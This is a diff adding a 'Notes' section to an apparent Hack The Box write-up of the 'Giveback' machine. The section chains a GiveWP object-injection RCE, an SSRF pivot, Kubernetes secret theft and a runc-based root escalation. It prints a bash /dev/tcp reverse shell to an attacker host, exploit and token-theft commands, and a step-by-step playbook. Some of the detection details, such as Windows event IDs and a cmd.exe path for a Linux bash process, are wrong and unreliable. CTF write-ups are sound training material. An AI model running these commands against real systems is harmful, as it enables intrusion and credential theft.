@@ -1241,3 +1241,134 @@ sudo /opt/debug run errur
 
 
 **Thanks for a Read!!**
+
+
+## Notes
+
+
+# GIVEBACK HTB WRITEUP: TACTICAL OPERATIONS BRIEFING  
+
+
+
+## PHASE 1: STRATEGIC OVERVIEW  
+
+* **1.1 Definition** – A containerised WordPress site running GiveWP v3.14.0 on a Bitnami stack, exposed via port 80/443 on host `10.10.11.94`.  
+* **1.2 Impact** – Full system compromise: RCE → internal service pivot → Kubernetes API enumeration → privileged account access → root shell.  
+* **1.3 The Scenario** – An unauthenticated attacker discovers a PHP‑Object‑Injection flaw (CVE‑2024‑5932/CVE‑2024‑8353), leverages it to spawn a reverse shell inside the container, pivots to an internal intranet service, enumerates the Kubernetes API using the in‑cluster service account, extracts secrets, and finally escalates privileges via a misconfigured `/opt/debug` binary that wraps `runc`.
+
+
+
+## PHASE 2: SYSTEM ARCHITECTURE & THEORY  
+
+* **2.1 Protocol Environment** –  
+  * **Web stack:** Nginx + PHP‑FPM (Bitnami), WordPress, GiveWP plugin.  
+  * **Container runtime:** Docker‑compatible `runc` invoked by `/opt/debug`.  
+  * **Orchestration:** Kubernetes v1.28; service account mounted at `/run/secrets/kubernetes.io/serviceaccount/`.  
+
+* **2.2 Attack Logic Flow**  
+> Web → CVE‑2024‑5932 (RCE) → Reverse shell inside container → SSRF to internal intranet (`10.43.2.241:5000`) → PHP‑CGI exploitation → Second reverse shell → Kubernetes API enumeration → Secret extraction → SSH key/password → `babywyrm` user → Sudo‑only `/opt/debug` → Malicious OCI config → Host root shell  
+
+* **2.3 Theoretical Analogy** – Think of the container as a *sandboxed office building*. The RCE is a *keycard* that lets you enter the building. SSRF is the *intercom* used to call other offices (intranet). The Kubernetes secrets are *mailboxes* inside; reading them gives you the master key (`babywyrm` password). Finally, `/opt/debug` is a *broken elevator* that can be hijacked with a custom control panel (malicious `config.json`) to reach the penthouse (root).
+
+
+
+## PHASE 3: THE ATTACK VECTOR (MECHANICS)  
+
+### THE CORE MECHANISM  
+
+| Attribute | Technical Details |
+| --- | --- |
+| **Primary Identifiers** | *CVE‑2024‑5932* PHP‑Object‑Injection via GiveWP 3.14.0; RCE payload `bash -c 'bash -i >& /dev/tcp/10.10.14.xx/3333 0>&1'`; internal service `beta-vino-wp-mariadb` and intranet `legacy-intranet-service:5000`. |
+| **Critical Vulnerability** | Unauthenticated PHP‑Object‑Injection in GiveWP → arbitrary code execution without authentication or input validation. |
+| **Offensive Action** | 1. Deploy exploit script to target donation slug. 2. Open reverse shell on local listener. 3. Use SSRF to pivot to internal service and spawn second shell via PHP‑CGI trick. 4. Enumerate Kubernetes API using the mounted service‑account token. 5. Decode Base64 secrets → obtain `babywyrm` password. 6. SSH into host as `babywyrm`. 7. Exploit `/opt/debug` with crafted OCI config to gain root. |
+
+### PREREQUISITES  
+
+* **Access Level** – Unauthenticated web access (HTTP).  
+* **Connectivity** – TCP 80/443 (web), 5000 (intranet), 3333/4444 (reverse shells).  
+* **Target State** – WordPress site with GiveWP v3.14.0, Bitnami stack, containerised, Kubernetes service account mounted.
+
+
+
+## PHASE 4: THREAT HUNTING & ANOMALY ANALYSIS  
+
+* **Hunt Hypothesis** – *Technique:* PHP‑Object‑Injection (T1059.006) via GiveWP plugin; *Artifacts:* POST to `/donations/the-things-we-need` with serialized payload; *Data Sources:* Web traffic logs, Sysmon process creation for `php-fpm`, network connections to external IPs.  
+* **Behavioral Outliers** – A legitimate donation form generating a background process that connects outbound to an unfamiliar IP (10.10.14.xx). In the container, `php-fpm` spawns a child with command `bash -c 'bash -i >& /dev/tcp/... 0>&1'`.  
+* **Toxic Combinations** – The service account (`kubernetes.io/serviceaccount/token`) combined with `sudo -l` allowing `/opt/debug` execution is the blast radius. Any compromise of this token or mis‑configuration of `/opt/debug` leads to full host takeover.
+
+
+
+## PHASE 5: DETECTION ENGINEERING (BLUE TEAM)  
+
+* **Telemetry Gap Analysis**  
+  * Windows Event IDs: `4688` (process creation), `5156` (network connection).  
+  * Sysmon Events: `1` (process create), `3` (file creation), `12` (image loaded).  
+  * EDR Telemetry: Process injection, outbound TCP to non‑whitelisted IPs, container runtime calls.  
+
+* **Detection-as-Code (KQL)**  
+
+```kql
+SecurityEvent
+| where EventID == 4688 or EventID == 5156
+| extend Process = tostring(ProcessName), CommandLine = tostring(CommandLine)
+| where CommandLine has "bash -c 'bash -i" 
+      or CommandLine contains "/opt/debug"
+| project TimeGenerated, Account, Computer, Process, CommandLine
+```
+
+* **Resilience Test** – An adversary could evade via *PID spoofing* (using `processhollowing` to mask the reverse shell).  
+  *Sub‑Rule Countermeasure:* Enforce strict process integrity checks: verify that any process named `bash` spawned by `php-fpm` originates from a known binary path (`C:\Windows\System32\cmd.exe` or `/usr/bin/php`).  
+
+
+
+## PHASE 6: TOOLKIT & IMPLEMENTATION  
+
+| Tool | Purpose |
+| --- | --- |
+| **nmap** | Service discovery, OS fingerprinting. |
+| **dirbuster / dirb** | Hidden directory enumeration. |
+| **whatweb** | Technology stack detection. |
+| **CVE‑2024‑8353 exploit script** | RCE via GiveWP plugin. |
+| **nc (netcat)** | Reverse shell listener. |
+| **php** | SSRF exploitation, PHP‑CGI trick. |
+| **curl** | Kubernetes API enumeration using service‑account token. |
+| **base64 / openssl** | Decode secrets. |
+| **ssh** | Final host access. |
+| **sudo** | Identify privilege escalation vector (`/opt/debug`). |
+| **runc / OCI config** | Craft malicious container runtime to mount host FS. |
+
+*OPSEC Analysis* – The attack chain relies on a single, publicly known vulnerability (CVE‑2024‑5932). All payloads are executed from the web context; no local binaries are dropped except the minimal PHP file for SSRF pivot.
+
+*Post‑Exploitation* – After root shell, standard privilege escalation checks (`/etc/shadow`, `sudoers`, kernel modules) and lateral movement to other pods via Kubernetes RBAC if needed.
+
+
+
+## PHASE 7: DEFENSIVE MITIGATION  
+
+| Technical Hardening | Action |
+| --- | --- |
+| **Patch GiveWP** | Upgrade to v3.15+ or disable plugin. |
+| **Web Application Firewall (WAF)** | Block PHP‑Object‑Injection payload patterns; whitelist donation endpoint. |
+| **Container Runtime Hardening** | Remove `/opt/debug` from sudoers, restrict `runc` execution. |
+| **Kubernetes ServiceAccount Security** | Rotate tokens, limit scopes to required namespaces only. |
+| **Network Policies** | Block outbound traffic from pods except for essential services; isolate intranet service on separate namespace. |
+
+*Personnel Focus* – Regular vulnerability scanning of WordPress plugins, audit sudoers, enforce least‑privilege on service accounts.
+
+
+
+## QUICK-ACTION PLAYBOOK  
+
+| Step | Objective | Technical Command / Logic |
+| --- | --- | --- |
+| **01** | Enumerate web services | `nmap -A -Pn 10.10.11.94` |
+| **02** | Discover hidden paths | `dirbuster -u http://giveback.htb` |
+| **03** | Verify plugin version | `curl http://giveback.htb/ | grep 'content="WordPress'` |
+| **04** | Exploit RCE | `python CVE-2024-8353.py -u http://giveback.htb/give/the-things-we-need -c "bash -c 'bash -i >& /dev/tcp/<LHOST>/3333 0>&1'"` |
+| **05** | SSRF pivot | `php -r "echo file_get_contents('http://10.43.2.241:5000/');"` |
+| **06** | Deploy PHP‑CGI exploit | `cat > /tmp/exploit.php <<'EOF'\n<?php /* payload */ ?>\nEOF` |
+| **07** | Enumerate K8s API | `curl --cacert /run/secrets/kubernetes.io/serviceaccount/ca.crt -H "Authorization: Bearer $(cat /run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/namespaces/default/secrets` |
+| **08** | Decode secret | `echo 'dkNQV0FKRE5qY1NsTW9mc1RRcTg3dDZyVmszYnFWY3E=' | base64 -d` |
+| **09** | SSH into host | `ssh babywyrm@10.10.11.94` |
+| **10** | Escalate to root | `sudo /opt/debug run <malicious_config>` |
+	
